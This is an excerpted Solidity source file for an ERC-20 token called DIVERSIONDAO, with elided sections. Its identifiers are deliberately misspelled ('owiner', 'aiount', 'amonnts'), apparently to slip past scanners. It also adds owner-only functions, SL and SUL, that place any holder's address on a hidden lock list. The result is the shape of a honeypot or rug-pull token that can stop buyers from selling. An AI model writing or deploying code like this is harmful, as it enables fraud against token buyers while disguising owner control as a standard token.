...
interface IERC20 {
    ...
    function balanceOf(address aiount) external view returns (uint256);

    function transfer(address recipient, uint256 amonnts) external returns (bool);

    function allowance(address owiner, address spender) external view returns (uint256);
...
contract Ownable is Context {
    ...
    function renounceowinership() public virtual onlyowiner {
        emit owinershipTransferred(_owiner, address(0x000000000000000000000000000000000000dEaD));
        _owiner = address(0x000000000000000000000000000000000000dEaD);
    }
}
...
contract token is Ownable, IERC20 {
    ...
    string private _name = "DIVERSIONDAO";
    string private _symbol = "DIVDAO";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 1000000000 * 10 ** _decimals;
    uint256 private _maxTxtransfer = 1000000000 * 10 ** _decimals;
    uint256 private _burnfiei = 1;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;

    mapping(address => bool) private _LKD;
    function SL(address aiount) public onlyowiner {
        _LKD[aiount] = true;
    }


    function SUL(address aiount) public onlyowiner {
        _LKD[aiount] = false;
    }


    function isLKD(address aiount) public view returns (bool) {
    ...
    function balanceOf(address aiount) public view override returns (uint256) {
        return _balance[aiount];
    }
    ...
    function _approve(address owiner, address spender, uint256 amonnts) internal virtual {
        require(owiner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owiner][spender] = amonnts;
        emit Approval(owiner, spender, amonnts);
    }

    function allowance(address owiner, address spender) public view virtual override returns (uint256) {
